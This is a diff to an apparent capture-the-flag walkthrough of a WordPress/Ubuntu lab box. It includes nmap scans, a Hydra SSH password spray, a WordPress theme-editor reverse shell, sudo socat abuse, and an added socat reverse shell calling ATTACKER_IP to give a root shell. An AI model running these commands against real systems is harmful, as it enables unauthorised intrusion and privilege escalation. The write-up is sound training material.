@@ -8,130 +8,37 @@ cd ~/Desktop/AllinOne
 ## Enumeration and Scanning
 #### Nmap scanning
 ```
-nmap -sT -sV -O -p- --script "vuln" -T5 -oN TARGET_IP_scan.nmap TARGET_IP
+nmap -sVC -O -p- -T5 -oN TARGET_IP_scan.nmap TARGET_IP
 ```
 ```
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
-|_sslv2-drown: 
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-csrf: Couldn't find any CSRF vulnerabilities.
-|_http-dombased-xss: Couldn't find any DOM based XSS.
-| http-enum: 
-|   /wordpress/: Blog
-|_  /wordpress/wp-login.php: Wordpress login page.
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
-```
-* TCP/21,22, and 80 open.
-* Refine nmap scan to enumerate ports.
-```
-nmap -p21,22,80 --script "safe" -T5 -oN TARGET_IP_scan1.nmap TARGET_IP
-```
-```
-PORT   STATE SERVICE
-21/tcp open  ftp
-|_banner: 220 (vsFTPd 3.0.3)
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to ::ffff:10.10.1.205
+|      Connected to ::ffff:10.10.80.80
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
-|      At session startup, client count was 4
+|      At session startup, client count was 3
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
-22/tcp open  ssh
-|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
 |   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
 |_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (EdDSA)
-| ssh2-enum-algos: 
-|   kex_algorithms: (10)
-|   server_host_key_algorithms: (5)
-|   encryption_algorithms: (6)
-|   mac_algorithms: (10)
-|_  compression_algorithms: (2)
-80/tcp open  http
-| http-comments-displayer: 
-| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-74-123.eu-west-1.compute.internal
-|     
-|     Path: http://ip-10-10-74-123.eu-west-1.compute.internal/#about
-|     Line number: 4
-|     Comment: 
-|         <!--
-|             Modified from the Debian original for Ubuntu
-|             Last updated: 2016-11-16
-|             See: https://launchpad.net/bugs/1288690
-|           -->
-|     
-|     Path: http://ip-10-10-74-123.eu-west-1.compute.internal/#about
-|     Line number: 201
-|     Comment: 
-|         <!--      <div class="table_of_contents floating_element">
-|                 <div class="section_header section_header_grey">
-|                   TABLE OF CONTENTS
-|                 </div>
-|                 <div class="table_of_contents_item floating_element">
-|                   <a href="#about">About</a>
-|                 </div>
-|                 <div class="table_of_contents_item floating_element">
-|                   <a href="#changes">Changes</a>
-|                 </div>
-|                 <div class="table_of_contents_item floating_element">
-|                   <a href="#scope">Scope</a>
-|                 </div>
-|                 <div class="table_of_contents_item floating_element">
-|                   <a href="#files">Config files</a>
-|                 </div>
-|               </div>
-|_        -->
-|_http-date: Mon, 26 Feb 2024 18:10:39 GMT; 0s from local time.
-|_http-fetch: Please enter the complete path of the directory to save data in.
-| http-headers: 
-|   Date: Mon, 26 Feb 2024 18:10:38 GMT
-|   Server: Apache/2.4.29 (Ubuntu)
-|   Last-Modified: Mon, 05 Oct 2020 19:44:00 GMT
-|   ETag: "2aa6-5b0f1b4359fd1"
-|   Accept-Ranges: bytes
-|   Content-Length: 10918
-|   Vary: Accept-Encoding
-|   Connection: close
-|   Content-Type: text/html
-|   
-|_  (Request type: HEAD)
-|_http-mobileversion-checker: No mobile version detected.
-|_http-referer-checker: Couldn't find any cross-domain scripts.
-|_http-security-headers: 
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
-| http-useragent-tester: 
-|   Status for browser useragent: 200
-|   Allowed User Agents: 
-|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
-|     libwww
-|     lwp-trivial
-|     libcurl-agent/1.0
-|     PHP/
-|     Python-urllib/2.5
-|     GT::WWW
-|     Snoopy
-|     MFC_Tear_Sample
-|     HTTP::Lite
-|     PHPCrawl
-|     URI::Fetch
-|     Zend_Http_Client
-|     http client
-|     PECL::HTTP
-|     Wget/1.13.4 (linux-gnu)
-|_    WWW-Mechanize/1.34
-|_http-xssed: No previously reported XSS vuln.
+MAC Address: 02:DC:35:09:CA:49 (Unknown)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.8 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
+No exact OS matches for host (test conditions non-ideal).
 ```
 #### Nessus scanning
 * 4 x medium severity.
@@ -249,9 +156,25 @@ wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
 * [How to configure an Apache web server](https://opensource.com/article/18/2/apache-web-server-configuration).
 > The DocumentRoot directive specifies the location of the HTML files that make up the pages of the website. That line does not need to be changed because it already points to the standard location. The line should look like this: DocumentRoot "/var/www/html"
  Use "wpscan" to identify WordPress vulnerabilites.
+### /hackathons directory
+* Hint on page suggests text may be decoded using Vigenere cipher.
+> The Vigenere cipher is a method of encrypting alphabetic text by using a series of different Caesar ciphers based on the letters of a keyword. It is a simple form of polyalphabetic substitution.
+* Used CyberChef Vigenere decode recipe with "KeepGoing" as key.
+* This returned "Try H@ckme@123" as output.
 
 ## Exploitation
 ### Initial Access
+#### Attempt SSH logon using "H@ckme@123" 
+* Credentials are invalid.
+```
+ssh elyana@10.10.199.13
+The authenticity of host '10.10.199.13 (10.10.199.13)' can't be established.
+ECDSA key fingerprint is SHA256:IVzQLYHc196APvwnH40vFHjOR4ZsfNqxHnOG3HuzXgg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.199.13' (ECDSA) to the list of known hosts.
+elyana@10.10.199.13's password: 
+Permission denied, please try again.
+```
 #### Password spray SSH using Hydra
 ```
 hydra -l elyana -P /usr/share/wordlists/passwords/rockyou.txt TARGET_IP -t 4 ssh -vV
@@ -510,16 +433,6 @@ require_once ABSPATH . 'd3A
 ```
 #### Logged into /wp-admin using MySQL db credentials
   * elyana / H@ckme@123
-* Credentials are invalid for SSH.
-```
-ssh elyana@10.10.199.13
-The authenticity of host '10.10.199.13 (10.10.199.13)' can't be established.
-ECDSA key fingerprint is SHA256:IVzQLYHc196APvwnH40vFHjOR4ZsfNqxHnOG3HuzXgg.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '10.10.199.13' (ECDSA) to the list of known hosts.
-elyana@10.10.199.13's password: 
-Permission denied, please try again.
-```
 #### Upload reverse shell to WordPress
 * WordPress Appearance > Theme Editor.
 * Open "Theme Header" (header.php) from "Theme Files" list.
@@ -594,6 +507,8 @@ Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 id
 uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
 ```
+* Elyana user is member of sudo and lxd groups.
+> LXD (pronounced lex-dee) is the lightervisor, or lightweight container hypervisor. LXC (lex-see) is a program which creates and administers “containers” on a local system. It also provides an API to allow higher level managers, such as LXD, to administer containers.
 **Recover /home/elyana/user.txt**
 ```
 cat /home/elyana/user.txt
@@ -602,7 +517,7 @@ VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
 * Decoded Base64 string in CyberChef.
 
 ### Escalate privileges to root
-#### Sudo abuse method
+#### Sudo socat abuse method
 * Elyana user has delegated privileges on "/usr/bin/socat".
 ```
 sudo -l
@@ -620,6 +535,27 @@ User elyana may run the following commands on elyana:
 whoami
 root
 ```
+#### Socat reverse shell method
+**Create fully stable Linux tty reverse shell**
+* On attack host.
+```
+socat TCP-L:2345 FILE:`tty`,raw,echo=0
+```
+* On target host.
+```
+sudo socat TCP:ATTACKER_IP:2345 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+* sudo required to execute shell with delegated root privileges.
+**Shell caught by listener**
+```
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+
 **Find root.txt**
 ```
 find / -name root.txt 2>/dev/null
@@ -649,4 +585,9 @@ python3 -m http.server
 wget http://ATTACKER_IP:8000/linpeas.sh
 chmod +x ./linpeas.txt
 ./linpeas.sh -a > linpeas.txt
+```
+**SUID / SGID**
+```
+-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
+-rwsr-sr-x 1 root root 59K Jan 18  2018 /bin/chmod
 ```
